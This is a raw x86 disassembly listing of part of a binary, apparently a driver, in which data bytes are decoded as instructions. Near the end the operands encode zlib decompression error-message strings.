   1e716:	imul   eax,DWORD PTR [eax],0xe
   1e719:	add    BYTE PTR [edi],dl
   1e71b:	add    BYTE PTR [eax+eax*1],bl
   1e71e:	or     eax,DWORD PTR [eax]
   1e720:	or     DWORD PTR [eax],eax
   1e722:	pop    edi
   1e723:	add    BYTE PTR [ecx],al
   1e725:	add    BYTE PTR [eax+eax*1],bl
   1e728:	dec    edx
   1e729:	add    BYTE PTR [eax],cl
   1e72b:	add    BYTE PTR [eax],al
   1e72d:	add    BYTE PTR [eax],al
   1e72f:	add    ch,cl
   1e731:	imul   ebx,DWORD PTR [edx+0x5c8f816],0x7cdcf049
   1e73b:	mov    edx,0x9bf4e386
   1e740:	mov    ebx,0x2a18d41c
   1e745:	pop    esi
   1e746:	(bad)  
   1e747:	sub    BYTE PTR [ebp+ecx*8+0x3b],bl
   1e74b:	push   edi
   1e74c:	sti    
   1e74d:	push   ebx
   1e74e:	jecxz  0x1e6f5
   1e750:	ins    BYTE PTR es:[edi],dx
   1e751:	inc    edx
   1e752:	pop    esi
   1e753:	ror    BYTE PTR [ecx-0x19],0x5b
   1e757:	call   0xd3d25807
   1e75c:	add    ah,cl
   1e75e:	outs   dx,BYTE PTR ds:[esi]
   1e75f:	sbb    dl,BYTE PTR [eax]
   1e761:	or     BYTE PTR [eax],al
   1e763:	inc    edx
   1e764:	dec    edx
   1e765:	or     BYTE PTR [eax],al
   1e767:	add    BYTE PTR [eax],bh
   1e769:	push   ds
   1e76a:	inc    esp
   1e76b:	(bad)  
   1e76c:	xchg   edi,eax
   1e76d:	clc    
   1e76e:	sbb    al,0x70
   1e770:	sar    DWORD PTR [ebx-0x3344002],cl
   1e776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e777:	jae    0x1e748
   1e779:	jmp    0x1e7ef
   1e77b:	sbb    ebx,DWORD PTR [ebp+0x3b]
   1e77e:	fs mov cl,0x30
   1e781:	stos   BYTE PTR es:[edi],al
   1e782:	sub    eax,0x40bcb1ee
   1e787:	jp     0x1e74a
   1e789:	fmul   st(3),st
   1e78b:	or     eax,0xd3e88a2f
   1e790:	in     eax,dx
   1e791:	mov    WORD PTR [ebx+0x4a7b1934],ds
   1e797:	in     al,dx
   1e798:	and    eax,0xef15932
   1e79d:	bound  ecx,QWORD PTR [esi]
   1e79f:	retf   0xa8c
   1e7a2:	add    ah,cl
   1e7a4:	pop    esp
   1e7a5:	add    BYTE PTR [edi],cl
   1e7a7:	add    BYTE PTR [edx],ch
   1e7a9:	add    BYTE PTR [edx],cl
   1e7ab:	add    BYTE PTR [edi],al
   1e7ad:	add    BYTE PTR [ecx],dl
   1e7af:	add    BYTE PTR [eax],cl
   1e7b1:	add    BYTE PTR [edi],bh
   1e7b3:	add    BYTE PTR ds:0x1b000000,bh
   1e7b9:	add    BYTE PTR [eax],ch
   1e7bb:	add    BYTE PTR [edi],ch
   1e7bd:	add    BYTE PTR [edx],cl
   1e7bf:	add    BYTE PTR [edx],cl
   1e7c1:	add    BYTE PTR [edi],al
   1e7c3:	add    BYTE PTR [ecx],dl
   1e7c5:	add    BYTE PTR [eax],cl
   1e7c7:	add    BYTE PTR [esi+0x0],bl
   1e7ca:	add    DWORD PTR [eax],eax
   1e7cc:	outs   dx,BYTE PTR ds:[esi]
   1e7cd:	add    BYTE PTR [eax],al
   1e7cf:	add    BYTE PTR [edx+eiz*8+0x3d],bl
   1e7d3:	jo     0x1e756
   1e7d5:	jge    0x1e7e0
   1e7d7:	mov    ch,0x47
   1e7d9:	dec    ecx
   1e7da:	mov    al,0x5c
   1e7dc:	dec    edi
   1e7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e7de:	sbb    DWORD PTR [edi+eax*1-0x24f05d16],esi
   1e7e5:	push   cs
   1e7e6:	call   0x21f75c25
   1e7eb:	sar    DWORD PTR [eax],1
   1e7ed:	hlt    
   1e7ee:	test   DWORD PTR [edx+0x2],ecx
   1e7f1:	daa    
   1e7f2:	ret    0x493d
   1e7f5:	or     BYTE PTR [esi+esi*1-0x35bdba2b],cl
   1e7fc:	add    DWORD PTR [eax],0x3
   1e7ff:	pop    eax
   1e800:	outs   dx,BYTE PTR ds:[si]
   1e802:	dec    eax
   1e803:	lea    edi,ds:0x7e369641
   1e809:	aaa    
   1e80a:	mov    BYTE PTR [ebx-0x2d41edf9],al
   1e810:	stos   DWORD PTR es:[edi],eax
   1e811:	sub    al,0xe4
   1e813:	sub    esp,DWORD PTR [ebx]
   1e815:	or     bl,cl
   1e817:	pop    eax
   1e818:	push   ss
   1e819:	mov    ah,0xeb
   1e81b:	push   0xba8c9cb3
   1e820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e821:	ins    BYTE PTR es:[edi],dx
   1e822:	retf   
   1e823:	wrmsr  
   1e825:	adc    BYTE PTR [eax+ecx*4+0x477737e2],ah
   1e82c:	push   ebp
   1e82d:	lahf   
   1e82e:	and    DWORD PTR [ebx],esi
   1e830:	sub    esp,DWORD PTR [edi-0x33ffa8d6]
   1e836:	je     0x1e8b4
   1e838:	xchg   edx,eax
   1e839:	lods   al,BYTE PTR ds:[esi]
   1e83a:	xchg   DWORD PTR ds:0x1c8a95f3,ecx
   1e840:	dec    edi
   1e841:	push   ecx
   1e842:	int3   
   1e843:	mov    ecx,0x296c9763
   1e848:	inc    esi
   1e849:	push   eax
   1e84a:	mov    bl,0x57
   1e84c:	cdq    
   1e84d:	pop    ss
   1e84e:	sti    
   1e84f:	jmp    0x89b6f7ca
   1e854:	or     al,0x3c
   1e856:	loopne 0x1e854
   1e858:	dec    ecx
   1e859:	imul   esi,DWORD PTR [ecx+0x21a78ac1],0xffffff8a
   1e860:	push   esi
   1e861:	shr    BYTE PTR [esi],1
   1e863:	rol    BYTE PTR [eax],1
   1e865:	int3   
   1e866:	add    BYTE PTR cs:[ebp+0x0],bl
   1e86a:	or     al,BYTE PTR [eax]
   1e86c:	or     al,BYTE PTR [eax]
   1e86e:	add    BYTE PTR [eax],al
   1e870:	sbb    ch,0x11
   1e873:	shl    DWORD PTR [esi],cl
   1e875:	adc    bl,bl
   1e877:	xchg   edi,eax
   1e878:	mov    ch,BYTE PTR [ecx+0x5a767f7d]
   1e87e:	pop    eax
   1e87f:	leave  
   1e880:	mov    bh,0xe4
   1e882:	push   ss
   1e883:	add    BYTE PTR [ebx*1-0x232cfbe0],0x71
   1e88b:	(bad)  
   1e88c:	xchg   ebx,eax
   1e88d:	sbb    DWORD PTR [esi],esi
   1e88f:	or     dh,dl
   1e891:	mov    ebp,0xb20c25
   1e896:	test   al,0xc
   1e898:	adc    BYTE PTR gs:[edi+0x54257d41],dl
   1e89f:	dec    eax
   1e8a0:	jl     0x1e8a4
   1e8a2:	xor    dh,BYTE PTR [edi+0x1c]
   1e8a5:	sbb    esp,DWORD PTR [ebp+0x30b8467e]
   1e8ab:	add    al,0xdf
   1e8ad:	int3   
   1e8ae:	cmp    ch,0x96
   1e8b1:	add    DWORD PTR [esi],edx
   1e8b3:	mov    WORD PTR [edx-0x79],cs
   1e8b6:	xchg   edx,eax
   1e8b7:	sbb    edx,edx
   1e8b9:	mov    esi,0x27df0906
   1e8be:	scas   al,BYTE PTR es:[edi]
   1e8bf:	or     esi,DWORD PTR [edx]
   1e8c1:	les    esp,FWORD PTR [bx+si+0x47]
   1e8c5:	jg     0x1e90f
   1e8c7:	(bad)  
   1e8c8:	mov    dl,0xca
   1e8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e8cb:	add    eax,0xcc009bf5
   1e8d0:	pop    esp
   1e8d1:	add    BYTE PTR [edi],cl
   1e8d3:	add    BYTE PTR [edx],ch
   1e8d5:	add    BYTE PTR [edx],cl
   1e8d7:	add    BYTE PTR [edi],al
   1e8d9:	add    BYTE PTR [ecx],dl
   1e8db:	add    BYTE PTR [eax],cl
   1e8dd:	add    BYTE PTR [edi],bh
   1e8df:	add    BYTE PTR ds:0x1b000000,bh
   1e8e5:	add    BYTE PTR [eax],al
   1e8e7:	add    BYTE PTR [esi-0x6e35ae14],ch
   1e8ed:	xchg   BYTE PTR ds:[edi+0x3d82d8bc],dh
   1e8f4:	inc    ebp
   1e8f5:	lods   al,BYTE PTR ds:[esi]
   1e8f6:	xchg   BYTE PTR [ecx],bh
   1e8f8:	mov    edx,0xd5b7c2d7
   1e8fd:	hlt    
   1e8fe:	aam    0x89
   1e900:	dec    edi
   1e901:	push   ebx
   1e902:	xchg   edi,eax
   1e903:	push   esi
   1e904:	pop    es
   1e905:	push   ss
   1e906:	loop   0x1e909
   1e908:	(bad)  
   1e909:	out    dx,eax
   1e90a:	outs   dx,BYTE PTR ds:[esi]
   1e90b:	pushf  
   1e90c:	adc    BYTE PTR [ecx+ecx*2+0x56],0xe7
   1e911:	or     eax,0x5d915078
   1e916:	cmovp  ecx,DWORD PTR [esi]
   1e919:	or     bl,BYTE PTR [esi+0x3f]
   1e91c:	in     al,dx
   1e91d:	sbb    BYTE PTR [esi+ebx*1],cl
   1e920:	adc    ch,dh
   1e922:	sub    BYTE PTR [eax],al
   1e924:	pop    esp
   1e925:	add    BYTE PTR [esi],cl
   1e927:	add    BYTE PTR [edi],dh
   1e929:	add    BYTE PTR [edx],al
   1e92b:	add    BYTE PTR [esi],cl
   1e92d:	add    BYTE PTR [edx],bl
   1e92f:	add    BYTE PTR [edi],al
   1e931:	add    BYTE PTR [esi],al
   1e933:	add    BYTE PTR [ebx],cl
   1e935:	add    BYTE PTR ds:0x2c001100,ah
   1e93b:	add    BYTE PTR [edx],al
   1e93d:	add    BYTE PTR [ebx],cl
   1e93f:	add    BYTE PTR [ecx],al
   1e941:	add    BYTE PTR [edi],al
   1e943:	add    BYTE PTR [ebx],cl
   1e945:	add    BYTE PTR [ecx],bh
   1e947:	add    BYTE PTR [edi],cl
   1e949:	add    BYTE PTR [edx],cl
   1e94b:	add    BYTE PTR [edx],cl
   1e94d:	add    BYTE PTR [edi],al
   1e94f:	add    BYTE PTR [ecx],dl
   1e951:	add    BYTE PTR [eax],cl
   1e953:	add    BYTE PTR [ecx],dl
   1e955:	add    BYTE PTR [edi],bl
   1e957:	add    BYTE PTR [esi],dh
   1e959:	add    BYTE PTR [edi],al
   1e95b:	add    BYTE PTR [eax],al
   1e95d:	add    BYTE PTR [edi],dl
   1e95f:	add    BYTE PTR [ebx],cl
   1e961:	add    BYTE PTR [edx],bl
   1e963:	add    BYTE PTR [edi],dh
   1e965:	add    BYTE PTR [eax+eax*1],ch
   1e968:	add    DWORD PTR [eax],eax
   1e96a:	sbb    al,BYTE PTR [eax]
   1e96c:	push   es
   1e96d:	add    BYTE PTR ds:0x3f000300,bl
   1e973:	add    BYTE PTR [esi],dh
   1e975:	add    BYTE PTR [ecx],dl
   1e977:	add    BYTE PTR [eax],ch
   1e979:	add    BYTE PTR [edi],cl
   1e97b:	add    BYTE PTR [esi],dh
   1e97d:	add    BYTE PTR [edi],dl
   1e97f:	add    BYTE PTR [eax+eax*1],al
   1e982:	pop    ds
   1e983:	add    BYTE PTR [edx],cl
   1e985:	add    BYTE PTR [esi],al
   1e987:	add    BYTE PTR [esi],dl
   1e989:	add    BYTE PTR [edi],ch
   1e98b:	add    BYTE PTR [eax],al
   1e98d:	add    BYTE PTR [eiz*1+0xb5b5c08],al
   1e994:	xchg   ebx,eax
   1e995:	das    
   1e996:	pop    ss
   1e997:	push   eax
   1e998:	sbb    dh,BYTE PTR [edi+esi*2]
   1e99b:	hlt    
   1e99c:	mov    dh,0xb4
   1e99e:	aaa    
   1e99f:	xchg   ebp,eax
   1e9a0:	and    edi,ebx
   1e9a2:	das    
   1e9a3:	pmulhuw mm2,QWORD PTR [edx+0x11]
   1e9a7:	adc    al,0xe6
   1e9a9:	sbb    BYTE PTR [edx+0x19ce6ea5],0x70
   1e9b0:	or     ch,dh
   1e9b2:	jb     0x1e9b4
   1e9b4:	ins    BYTE PTR es:[edi],dx
   1e9b5:	add    BYTE PTR [edi],bl
   1e9b7:	add    BYTE PTR [edx],dl
   1e9b9:	add    BYTE PTR [edx],dl
   1e9bb:	add    BYTE PTR [eax],al
   1e9bd:	add    BYTE PTR [ebp+0x0],bl
   1e9c0:	dec    ebx
   1e9c1:	add    BYTE PTR ds:0x1d00,bl
   1e9c7:	add    BYTE PTR [ecx-0x47],ah
   1e9ca:	stos   DWORD PTR es:[edi],eax
   1e9cb:	dec    edi
   1e9cc:	call   0xcddc0e04
   1e9d1:	jp     0x1e9bf
   1e9d3:	sub    ch,BYTE PTR [esi+eax*2]
   1e9d6:	in     eax,dx
   1e9d7:	adc    eax,0xe0e34cde
   1e9dc:	or     BYTE PTR [ebx+0x251e0f45],cl
   1e9e2:	cmp    DWORD PTR [esi],esp
   1e9e4:	mov    eax,ds:0x229da3e3
   1e9e9:	retf   
   1e9ea:	xchg   esi,eax
   1e9eb:	cmc    
   1e9ec:	ss xchg esp,eax
   1e9ee:	inc    esp
   1e9ef:	jb     0x1ea05
   1e9f1:	sub    DWORD PTR [edx-0x22d87195],esp
   1e9f7:	add    BYTE PTR [edx+0x2d],bl
   1e9fa:	and    eax,0x18061637
   1e9ff:	or     BYTE PTR [ecx],dh
   1ea01:	cmp    al,0x1a
   1ea03:	pop    ss
   1ea04:	add    al,0x5
   1ea06:	add    ah,cl
   1ea08:	xchg   ecx,eax
   1ea09:	mov    ecx,ss
   1ea0b:	sbb    esp,DWORD PTR [ecx-0x2780f371]
   1ea11:	cs push eax
   1ea13:	or     BYTE PTR [ecx],cl
   1ea15:	daa    
   1ea16:	jb     0x1e9a2
   1ea18:	dec    ecx
   1ea19:	adc    al,0xd3
   1ea1b:	cli    
   1ea1c:	stos   DWORD PTR es:[edi],eax
   1ea1d:	cld    
   1ea1e:	je     0x1ea29
   1ea20:	hlt    
   1ea21:	outs   dx,BYTE PTR ds:[esi]
   1ea22:	inc    esp
   1ea23:	sti    
   1ea24:	in     eax,0x9b
   1ea26:	lods   al,BYTE PTR ds:[esi]
   1ea27:	test   BYTE PTR [ebp+0x4e00e4f1],al
   1ea2d:	cmp    ah,BYTE PTR [ebx]
   1ea2f:	and    eax,0x33111d1b
   1ea34:	aas    
   1ea35:	sbb    eax,DWORD PTR [esi]
   1ea37:	add    DWORD PTR [ecx*1+0x2082821],edx
   1ea3e:	sbb    eax,0x78cc000b
   1ea43:	mov    ecx,0x7717c09b
   1ea48:	gs jl  0x1ea0f
   1ea4b:	jb     0x1ea2b
   1ea4d:	fld    TBYTE PTR [esi+0x45]
   1ea50:	hlt    
   1ea51:	xchg   ebx,eax
   1ea52:	adc    ecx,DWORD PTR [ecx-0x41]
   1ea55:	mov    dl,0x36
   1ea57:	lock and al,0xa5
   1ea5a:	cmp    bh,dl
   1ea5c:	rol    DWORD PTR [ebx],0xa3
   1ea5f:	gs enter 0x7d1c,0x53
   1ea64:	lods   eax,DWORD PTR ds:[esi]
   1ea65:	sub    DWORD PTR [ecx+0x11],ebp
   1ea68:	std    
   1ea69:	or     DWORD PTR [edi+0x556fb500],esi
   1ea6f:	push   ecx
   1ea70:	das    
   1ea71:	ss nop
   1ea73:	js     0x1ea32
   1ea75:	sbb    esp,esp
   1ea77:	pop    esi
   1ea78:	adc    al,0x97
   1ea7a:	dec    edi
   1ea7b:	adc    eax,0x4e6bf787
   1ea80:	jl     0x1ea82
   1ea82:	pop    edx
   1ea83:	sub    eax,0x1b1d2227
   1ea88:	adc    DWORD PTR [esi],eax
   1ea8a:	pop    ss
   1ea8b:	and    bh,BYTE PTR [edi]
   1ea8d:	sbb    eax,DWORD PTR [esi]
   1ea8f:	add    DWORD PTR [ecx*1+0x2082821],edx
   1ea96:	sbb    eax,0xc0cc000b
   1ea9b:	fistp  DWORD PTR [edx]
   1ea9d:	repnz iret 
   1ea9f:	(bad)  
   1eaa1:	mov    ss,WORD PTR [eax+esi*8+0x55b49d93]
   1eaa8:	inc    ebx
   1eaa9:	inc    edx
   1eaaa:	(bad)  
   1eaab:	in     al,dx
   1eaac:	pop    es
   1eaad:	xor    al,BYTE PTR ds:0x2a323534
   1eab3:	in     eax,0xe
   1eab5:	dec    ebp
   1eab6:	out    dx,al
   1eab7:	and    DWORD PTR [ebx-0x37],ecx
   1eaba:	pop    esi
   1eabb:	add    BYTE PTR [esi+0x71e32b01],cl
   1eac1:	mul    DWORD PTR [esi]
   1eac3:	pop    ss
   1eac4:	pushf  
   1eac5:	lods   eax,DWORD PTR ds:[esi]
   1eac6:	cmp    eax,0x61d3e7ec
   1eacb:	xchg   ebp,eax
   1eacc:	and    dl,BYTE PTR [edi+0x5f]
   1eacf:	xchg   ecx,eax
   1ead0:	pop    eax
   1ead1:	call   0x880c:0xe0cf8220
   1ead8:	jne    0x1eb0f
   1eada:	jle    0x1ea9f
   1eadc:	imul   esi,edx,0x54
   1eadf:	or     edi,DWORD PTR [ebx-0xc]
   1eae2:	cmp    eax,DWORD PTR [eax]
   1eae4:	pop    esp
   1eae5:	add    BYTE PTR [eax],bl
   1eae7:	add    BYTE PTR [ebx],ch
   1eae9:	add    BYTE PTR [eax+eax*1],bl
   1eaec:	aaa    
   1eaed:	add    BYTE PTR [ecx],ah
   1eaef:	add    BYTE PTR [ebx],dl
   1eaf1:	add    BYTE PTR [edi],bl
   1eaf3:	add    BYTE PTR [edx],cl
   1eaf5:	add    BYTE PTR [esi],al
   1eaf7:	add    BYTE PTR [esi],dl
   1eaf9:	add    BYTE PTR [edi],ch
   1eafb:	add    BYTE PTR [ecx+0x0],bh
   1eafe:	push   esi
   1eaff:	add    BYTE PTR [eax],al
   1eb01:	add    BYTE PTR [ebx+0x179945e4],dl
   1eb07:	ds adc eax,0x29746ab
   1eb0d:	out    0x3b,al
   1eb0f:	std    
   1eb10:	push   esi
   1eb11:	mov    edi,0x673a7182
   1eb16:	lods   al,BYTE PTR ds:[esi]
   1eb17:	es lahf 
   1eb19:	mov    cl,0x1b
   1eb1b:	xchg   ebp,eax
   1eb1c:	mov    edi,0x87d7c7e6
   1eb21:	into   
   1eb22:	mov    eax,ds:0xb5c61e05
   1eb27:	sub    BYTE PTR [edx-0x78b3ba9e],al
   1eb2d:	sub    al,dl
   1eb2f:	fscale 
   1eb31:	add    BYTE PTR [eax+eax*1+0x18],bl
   1eb35:	add    BYTE PTR [ecx],ah
   1eb37:	add    BYTE PTR [ebx],dl
   1eb39:	add    BYTE PTR [edi],bl
   1eb3b:	add    BYTE PTR [edx],cl
   1eb3d:	add    BYTE PTR [esi],al
   1eb3f:	add    BYTE PTR [ecx],bh
   1eb41:	add    BYTE PTR [ecx+0x0],bh
   1eb44:	push   esi
   1eb45:	add    BYTE PTR [eax],al
   1eb47:	add    BYTE PTR [esi],ch
   1eb49:	scas   al,BYTE PTR es:[edi]
   1eb4a:	cmc    
   1eb4b:	xchg   esp,eax
   1eb4c:	clc    
   1eb4d:	add    BYTE PTR [esp+esi*1],0xfa
   1eb51:	jmp    0x1eba3
   1eb53:	xchg   edx,esp
   1eb55:	pop    edi
   1eb56:	stc    
   1eb57:	add    DWORD PTR [ebx+0x20],eax
   1eb5a:	adc    DWORD PTR [ebx+0x2fb5fe6],0x850442e
   1eb64:	fist   DWORD PTR [ecx]
   1eb66:	dec    ecx
   1eb67:	adc    al,0x72
   1eb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1eb6a:	mov    edi,0xf445df86
   1eb6f:	push   cs
   1eb70:	xor    esi,DWORD PTR [ecx]
   1eb72:	dec    ebx
   1eb73:	pop    ecx
   1eb74:	mov    BYTE PTR [esp+ecx*2],bl
   1eb77:	sub    al,0x50
   1eb79:	add    BYTE PTR [ebx+0x0],dl
   1eb7c:	jns    0x1eb7e
   1eb7e:	jae    0x1eb80
   1eb80:	inc    ebp
   1eb81:	add    BYTE PTR [esi+0x0],dh
   1eb84:	je     0x1eb86
   1eb86:	inc    ebx
   1eb87:	add    BYTE PTR [eax],al
   1eb89:	add    BYTE PTR [eax+eax*1+0x0],bl
   1eb8d:	add    BYTE PTR [edx+0x0],dh
   1eb90:	jb     0x1eb92
   1eb92:	add    BYTE PTR [eax],al
   1eb94:	push   ecx
   1eb95:	(bad)  
   1eb96:	jecxz  0x1eb3a
   1eb98:	jns    0x1eb84
   1eb9a:	cmp    al,0xef
   1eb9c:	push   esp
   1eb9d:	sbb    ebx,DWORD PTR [esi+0x5735592c]
   1eba3:	ficomp DWORD PTR [eax+0x7ada923f]
   1eba9:	addr16 jmp 0xa02d:0xd6a35d86
   1ebb1:	push   ebx
   1ebb2:	ss push ebx
   1ebb4:	mov    bl,0x7b
   1ebb6:	jb     0x1ec37
   1ebb8:	fdivr  DWORD PTR [ebx+0x733518d]
   1ebbe:	dec    edx
   1ebbf:	retf   
   1ebc0:	push   edi
   1ebc1:	rol    BYTE PTR [eax],1
   1ebc3:	int3   
   1ebc4:	and    eax,0x5ccc0053
   1ebc9:	add    BYTE PTR [ebx+0x0],dh
   1ebcc:	jns    0x1ebce
   1ebce:	jae    0x1ebd0
   1ebd0:	je     0x1ebd2
   1ebd2:	add    BYTE PTR gs:[ebp+0x0],ch
   1ebd6:	jb     0x1ebd8
   1ebd8:	outs   dx,DWORD PTR ds:[esi]
   1ebd9:	add    BYTE PTR [edi+0x0],ch
   1ebdc:	je     0x1ebde
   1ebde:	pop    esp
   1ebdf:	add    BYTE PTR [ebx+0x0],dh
   1ebe2:	jns    0x1ebe4
   1ebe4:	jae    0x1ebe6
   1ebe6:	je     0x1ebe8
   1ebe8:	add    BYTE PTR gs:[ebp+0x0],ch
   1ebec:	xor    eax,DWORD PTR [eax]
   1ebee:	xor    al,BYTE PTR [eax]
   1ebf0:	pop    esp
   1ebf1:	add    BYTE PTR ds:0x5300,ah
   1ebf7:	add    BYTE PTR [ecx],dh
   1ebf9:	xor    ch,BYTE PTR cs:[esi]
   1ebfc:	xor    eax,DWORD PTR [eax]
   1ebfe:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec05:	arpl   WORD PTR [eax+eiz*1+0x6c],si
   1ec09:	outs   dx,BYTE PTR gs:[esi]
   1ec0b:	addr16 je 0x1ec76
   1ec0e:	and    BYTE PTR [ebx+0x68],ah
   1ec11:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ec15:	int3   
   1ec16:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec1d:	arpl   WORD PTR [eax+eiz*1+0x64],si
   1ec21:	popa   
   1ec22:	je     0x1ec85
   1ec24:	and    BYTE PTR [ebx+0x68],ah
   1ec27:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ec2b:	int3   
   1ec2c:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ec33:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ec37:	je     0x1ec9a
   1ec39:	outs   dx,BYTE PTR ds:[esi]
   1ec3a:	arpl   WORD PTR [ebp+0x20],sp
   1ec3d:	je     0x1ecae
   1ec3f:	outs   dx,DWORD PTR ds:[esi]
   1ec40:	and    BYTE PTR [esi+0x61],ah
   1ec43:	jb     0x1ec65
   1ec45:	bound  esp,QWORD PTR [ecx+0x63]
   1ec48:	imul   eax,DWORD PTR [eax],0x69
   1ec4b:	outs   dx,BYTE PTR ds:[esi]
   1ec4c:	jbe    0x1ecaf
   1ec4e:	ins    BYTE PTR es:[edi],dx
   1ec4f:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ec57:	outs   dx,BYTE PTR ds:[esi]
   1ec58:	arpl   WORD PTR [ebp+0x20],sp
   1ec5b:	arpl   WORD PTR [edi+0x64],bp
   1ec5e:	add    BYTE PTR gs:[ecx+0x6e],ch
   1ec62:	jbe    0x1ecc5
   1ec64:	ins    BYTE PTR es:[edi],dx
   1ec65:	imul   esp,DWORD PTR [eax+eiz*1+0x6c],0x72657469
   1ec6d:	popa   
   1ec6e:	ins    BYTE PTR es:[edi],dx
   1ec6f:	das    
   1ec70:	ins    BYTE PTR es:[edi],dx
   1ec71:	outs   dx,BYTE PTR gs:[esi]
   1ec73:	addr16 je 0x1ecde
   1ec76:	and    BYTE PTR [ebx+0x6f],ah
   1ec79:	fs add BYTE PTR gs:[ecx+0x6e],ch
   1ec7e:	jbe    0x1ece1
   1ec80:	ins    BYTE PTR es:[edi],dx
   1ec81:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ec89:	outs   dx,BYTE PTR ds:[esi]
   1ec8a:	arpl   WORD PTR [ebp+0x73],sp
   1ec8d:	and    BYTE PTR [ebx+0x65],dh
   1ec90:	je     0x1ec92
   1ec92:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ec99:	and    BYTE PTR [ecx+ebp*2+0x74],ch
   1ec9d:	gs jb  0x1ed01
   1eca0:	ins    BYTE PTR es:[edi],dx
   1eca1:	das    
   1eca2:	ins    BYTE PTR es:[edi],dx
   1eca3:	outs   dx,BYTE PTR gs:[esi]
   1eca5:	addr16 je 0x1ed10
   1eca8:	jae    0x1ecca
   1ecaa:	jae    0x1ed11
   1ecac:	je     0x1ecae
   1ecae:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ecb5:	and    BYTE PTR [edx+0x69],ah
   1ecb8:	je     0x1ecda
   1ecba:	ins    BYTE PTR es:[edi],dx
   1ecbb:	outs   dx,BYTE PTR gs:[esi]
   1ecbd:	addr16 je 0x1ed28
   1ecc0:	and    BYTE PTR [edx+0x65],dh
   1ecc3:	jo     0x1ed2a
   1ecc5:	popa   
   1ecc6:	je     0x1ecc8
   1ecc8:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1eccf:	and    BYTE PTR [ebx+0x6f],ah
   1ecd2:	fs and BYTE PTR gs:[ebp+eiz*2+0x6e],ch
   1ecd8:	addr16 je 0x1ed43
   1ecdb:	jae    0x1ecfd
   1ecdd:	jae    0x1ed44
   1ecdf:	je     0x1ece1
   1ece1:	int3   
   1ece2:	je     0x1ed53
   1ece4:	outs   dx,DWORD PTR ds:[esi]
   1ece5:	and    BYTE PTR [ebp+0x61],ch
   1ece8:	outs   dx,BYTE PTR ds:[esi]
   1ece9:	jns    0x1ed0b
   1eceb:	ins    BYTE PTR es:[edi],dx
   1ecec:	outs   dx,BYTE PTR gs:[esi]
   1ecee:	addr16 je 0x1ed59
   1ecf1:	and    BYTE PTR [edi+0x72],ch
   1ecf4:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ecf8:	je     0x1ed5b
   1ecfa:	outs   dx,BYTE PTR ds:[esi]
   1ecfb:	arpl   WORD PTR [ebp+0x20],sp
   1ecfe:	jae    0x1ed79
   1ed00:	ins    DWORD PTR es:[edi],dx
   1ed01:	bound  ebp,QWORD PTR [edi+0x6c]
   1ed04:	jae    0x1ed06
   1ed06:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed0d:	and    BYTE PTR [ebx+0x74],dh
   1ed10:	outs   dx,DWORD PTR ds:[esi]
   1ed11:	jb     0x1ed78
   1ed13:	and    BYTE PTR fs:[edx+0x6c],ah
   1ed17:	outs   dx,DWORD PTR ds:[esi]
   1ed18:	arpl   WORD PTR [ebx+0x20],bp
   1ed1b:	ins    BYTE PTR es:[edi],dx
   1ed1c:	outs   dx,BYTE PTR gs:[esi]
   1ed1e:	addr16 je 0x1ed89
   1ed21:	jae    0x1ed23
   1ed23:	int3   
   1ed24:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed2b:	and    BYTE PTR [edx+0x6c],ah
   1ed2e:	outs   dx,DWORD PTR ds:[esi]
   1ed2f:	arpl   WORD PTR [ebx+0x20],bp
   1ed32:	je     0x1edad
   1ed34:	jo     0x1ed9b
   1ed36:	add    ah,cl
   1ed38:	push   0x65646165
   1ed3d:	jb     0x1ed5f
   1ed3f:	arpl   WORD PTR [edx+0x63],si
   1ed42:	and    BYTE PTR [ebp+0x69],ch
   1ed45:	jae    0x1edb4
   1ed47:	popa   
   1ed48:	je     0x1edad
   1ed4a:	push   0x6b6e7500
   1ed4f:	outs   dx,BYTE PTR ds:[esi]
   1ed50:	outs   dx,DWORD PTR ds:[esi]
   1ed51:	ja     0x1edc1
   1ed53:	and    BYTE PTR [eax+0x65],ch
   1ed56:	popa   
   1ed57:	fs gs jb 0x1ed7b
   1ed5b:	data16 ins BYTE PTR es:[edi],dx
   1ed5d:	popa   
   1ed5e:	addr16 jae 0x1ed81
   1ed61:	jae    0x1edc8
   1ed63:	je     0x1ed65
   1ed65:	int3   
   1ed66:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ed6d:	arpl   WORD PTR [eax+eiz*1+0x68],si
   1ed71:	gs popa 
   1ed73:	fs gs jb 0x1ed97
   1ed77:	arpl   WORD PTR [eax+0x65],bp
   1ed7a:	arpl   WORD PTR [ebx+0x0],bp
   1ed7d:	int3   
   1ed7e:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed85:	and    BYTE PTR [edi+0x69],dh
   1ed88:	outs   dx,BYTE PTR ds:[esi]
   1ed89:	outs   dx,DWORD PTR fs:[esi]
   1ed8b:	ja     0x1edad
   1ed8d:	jae    0x1edf8
   1ed8f:	jp     0x1edf6
   1ed91:	add    BYTE PTR [ebp+0x6e],dh
   1ed94:	imul   ebp,DWORD PTR [esi+0x6f],0x77
   1ed98:	outs   dx,BYTE PTR ds:[esi]
   1ed99:	and    BYTE PTR [ebx+0x6f],ah
   1ed9c:	ins    DWORD PTR es:[edi],dx
   1ed9d:	jo     0x1ee11
   1ed9f:	gs jae 0x1ee15
   1eda2:	imul   ebp,DWORD PTR [edi+0x6e],0x74656d20
   1eda9:	.byte 0x68
   1edaa:	outs   dx,DWORD PTR ds:[esi]
   1edab:	fs
	...

Disassembly of section INIT:

